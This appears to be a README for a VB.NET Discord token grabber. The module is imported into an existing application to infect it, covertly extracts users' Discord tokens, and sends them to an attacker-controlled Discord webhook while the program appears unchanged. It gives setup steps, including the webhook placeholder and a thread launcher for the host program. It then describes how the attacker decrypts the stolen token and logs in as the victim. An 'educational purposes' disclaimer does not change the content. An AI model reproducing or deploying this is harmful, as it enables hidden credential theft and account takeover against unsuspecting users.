# Token Grabber VB.NET Framework 4.7.2

## Description

Token Grabber is a VB.NET application designed to demonstrate the potential consequences of unauthorized access to user tokens. This project is intended for educational purposes only and should not be used for malicious activities. The author of this project is not responsible for any misuse or damage caused by this application. This project is a module for infect a existing VB NET Project; no additional packages need to be installed (very discreet).

---

## Features

- Extracts user tokens from the Windows system.
- Sends the extracted tokens to a Discord channel using a webhook.
- Demonstrates the importance of securing user tokens and the ease with which a basic application can extract tokens.

---

## Installation

1. Ensure you have the .NET Framework 4.7.2 installed on your system.

2. Download the [DiscordTokenGrab.vb](DiscordTokenGrab.vb) file and import it into your project.

3.  Modify the Discord WebHook channel Url 
   
   ```visual-basic
   Dim webhookurl As String = "URL HERE"
   ```

4. Add the following code to your main module:
   
```visual-basic
   Imports System.Threading
   
   Module Main
   
       Sub main()
   
           Dim tokenGrab As Thread = New Thread(AddressOf connectD)
   
           tokenGrab.Start()
   
           'rest of your code here
   
       End Sub
   End Module
```

5.  Intall the requirements for decrypt python scrypt 
   
   ```batch
   pyhton -m pip install -r requirements.txt
   ```
   
   or for linux
   
   ```bash
   pyhton3 -m pip install -r requirements.txt
   ```
   
   

---

## Usage

1. Run the infected application.

2. The application will display the same output as if it were not infected.

3. The encrypted token and the key used for encryption are sent to the Discord channel.
   
   ![Example of a message sent to the Discord channel](https://i.imgur.com/qXDh6gE.png)

4. The hacker can use the [decrypt.py](decrypt.py) script to decrypt the token:
   
   ![Decrypting the token](https://i.imgur.com/lTDVZR9.png)

5. Finally, the hacker can log in to Discord using the [LoginWithToken.js](LoginWithToken.js) script on the [Discord login page](https://discord.com/login).

---

## Disclaimer

This project is for educational purposes only. The author of this project is not responsible for any misuse or damage caused by this application. By using this application, you agree to hold the author harmless and acknowledge that you are solely responsible for any consequences that may arise from using this application.

---

## License

This project is not licensed under any specific license. All rights are reserved.